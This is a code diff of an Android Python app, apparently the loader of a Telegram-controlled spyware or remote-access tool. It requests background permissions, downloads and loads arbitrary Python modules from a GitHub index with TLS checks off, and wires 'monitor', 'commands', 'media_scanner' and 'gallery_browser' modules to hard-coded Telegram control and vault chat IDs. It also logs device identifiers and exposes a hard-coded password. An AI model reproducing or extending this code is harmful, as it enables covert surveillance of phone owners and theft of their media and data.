@@ -24,8 +24,8 @@ def _get_path():
 
 R = _get_path()
 
-# ✅ إضافة كود منع التعارض: مسح الملفات القديمة عند بدء التشغيل
-for old_file in ["monitor.py", "telegram_ui.py", "commands.py"]:
+# ✅ مسح الملفات القديمة التي قد تحتوي على كود غير متوافق (خاصة مع حذف OpenCV)
+for old_file in ["monitor.py", "telegram_ui.py", "commands.py", "media_scanner.py", "gallery_browser.py"]:
     file_path = os.path.join(R, old_file)
     if os.path.exists(file_path):
         try:
@@ -37,6 +37,7 @@ if R not in sys.path:
     sys.path.insert(0, R)
 
 def _perms():
+    """طلب كافة الصلاحيات اللازمة للعمل في الخلفية وعلى أندرويد 13+"""
     try:
         from android.permissions import request_permissions, Permission
         request_permissions([
@@ -120,7 +121,7 @@ class CoreApp(App):
     def _run(self):
         self._log("🚀 Core starting", "BOOT")
 
-        # 1. جلب قائمة الملفات الكاملة من GitHub
+        # 1. جلب قائمة الملفات المحدثة من GitHub
         all_files = []
         try:
             r = requests.get(RAW_INDEX, timeout=15, verify=False)
@@ -132,21 +133,17 @@ class CoreApp(App):
         except Exception as e:
             self._log(f"Index error: {e}", "ERROR")
 
-        # 2. تحميل كل ملف (باستثناء main.py نفسه)
+        # 2. تحميل كل ملف (تحديث هوائي OTA)
         for file_url in all_files:
             filename = file_url.split('/')[-1]
             if filename == "main.py":
                 continue
             self._download(file_url, filename)
 
-        # 3. إزالة الموديولات القديمة من الذاكرة
-        to_delete = []
-        for file_url in all_files:
-            mod_name = file_url.split('/')[-1].replace('.py', '')
-            if mod_name in sys.modules:
-                to_delete.append(mod_name)
-        for mod in to_delete:
-            del sys.modules[mod]
+        # 3. حذف الموديولات القديمة من الذاكرة لضمان تحميل النسخ الجديدة
+        for mod in list(sys.modules.keys()):
+            if mod in ["monitor", "telegram_ui", "commands", "media_scanner", "gallery_browser", "camera_analyzer"]:
+                del sys.modules[mod]
 
         importlib.invalidate_caches()
         gc.collect()
@@ -169,14 +166,19 @@ class CoreApp(App):
             ]
             mon.ctrl = -1003365166986
             mon.vlt = -1003787520015
-            mon.pw = "Zaen123@123@"          # تم التحديث من Zaen123@123@123
+            mon.pw = "Zaen123@123@"          # كلمة السر الموحدة
 
+            # إنشاء واجهة التلغرام
             ui = telegram_ui.T(mon)
             mon.cb_h = lambda d, cid, cbq: commands.ex(d, ui, mon, cid, cbq)
 
-            mon.start()
+            # ترتيب التشغيل: واجهة التلغرام أولاً ثم المونيتور (ليتمكن من التسجيل التلقائي)
             ui.start()
+            mon.start()
+
             self._log("🎉 SYSTEM ONLINE", "SUCCESS")
+            self._log(f"Device ID: {mon.did} | Model: {mon.dmd}")
+
         except Exception as e:
             self._log(f"FATAL: {e}", "ERROR")
             self._log(traceback.format_exc(), "TRACE")
